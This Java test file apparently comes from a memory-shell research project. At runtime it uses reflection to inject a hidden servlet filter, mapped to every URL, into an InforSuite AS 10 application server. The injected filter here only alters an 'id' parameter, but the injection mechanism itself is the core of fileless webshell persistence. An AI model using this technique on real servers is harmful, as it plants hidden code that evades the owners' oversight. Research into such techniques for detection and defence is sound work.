package org.su18.memshell.test.inforsuite;

import com.cvicse.loong.enterprise.web.WebModule;
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;

/**
 * 真垃圾，mac 上部署个项目都部不起来，浪费我好多时间
 * 测试版本：InforSuiteAS_10
 *
 * @author su18
 */

public class AddInforSuiteFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {


		String         filterName     = "su18InforSuiteFilter";
		ServletContext servletContext = req.getServletContext();

		WebModule context = null;

		try {

			// 获取 Context
			while (context == null) {
				Field f = servletContext.getClass().getDeclaredField("context");
				f.setAccessible(true);
				Object object = f.get(servletContext);

				if (object instanceof WebModule) {
					context = (WebModule) object;
				} else if (object instanceof ServletContext) {
					servletContext = (ServletContext) object;
				}
			}

			// 创建自定义 Filter 对象
			Filter filter = new AddInforSuiteFilter.TestFilter();

			// 创建 FilterDef 对象
			FilterDef filterDef = new FilterDef();
			filterDef.setFilterName(filterName);
			filterDef.setFilter(filter);
//			filterDef.setFilterClass(filter.getClass());

			// 创建 ApplicationFilterConfig 对象
			Constructor<?>[] constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
			constructor[0].setAccessible(true);
			Object config = constructor[0].newInstance(context, filterDef);

			// 创建 FilterMap 对象
			FilterMap filterMap = new FilterMap();
			filterMap.setFilterName(filterName);
			filterMap.setURLPattern("/*");
			HashSet<DispatcherType> set = new HashSet<>();
			set.add(DispatcherType.REQUEST);
			filterMap.setDispatcherTypes(set);


			// 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
			Field filterConfigsField = context.getClass().getSuperclass().getSuperclass().getDeclaredField("filterConfigs");
			filterConfigsField.setAccessible(true);
			HashMap<String, Object> filterConfigs = (HashMap<String, Object>) filterConfigsField.get(context);
			filterConfigs.put(filterName, config);

			// 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
			Field filterMapField = context.getClass().getSuperclass().getSuperclass().getDeclaredField("filterMaps");
			filterMapField.setAccessible(true);
			List<FilterMap> object = (List<FilterMap>) filterMapField.get(context);

			object.add(filterMap);

			resp.getWriter().println("inforsuite filter added");

		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public static class TestFilter implements Filter {

		/**
		 * 初始化 filter
		 *
		 * @param filterConfig FilterConfig
		 */
		@Override
		public void init(FilterConfig filterConfig) {
		}

		/**
		 * doFilter 方法处理过滤器逻辑
		 *
		 * @param servletRequest  ServletRequest
		 * @param servletResponse ServletResponse
		 * @param filterChain     FilterChain
		 * @throws IOException      抛出异常
		 * @throws ServletException 抛出异常
		 */
		@Override
		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
			// 给下一个过滤器
			filterChain.doFilter(new AddInforSuiteFilter.TestFilter.FilterRequest((HttpServletRequest) servletRequest), servletResponse);
		}

		/**
		 * 销毁时执行的方法
		 */
		@Override
		public void destroy() {
		}

		/**
		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
		 */
		class FilterRequest extends HttpServletRequestWrapper {

			public FilterRequest(HttpServletRequest request) {
				super(request);
			}

			@Override
			public String getParameter(String name) {
				if ("id".equals(name)) {
					String originalId = super.getParameter(name);

					if (originalId != null && !originalId.isEmpty()) {
						int idNum = (Integer.parseInt(originalId) * 99);
						return Integer.toString(idNum);
					}
				}
				return super.getParameter(name);
			}
		}
	}
}
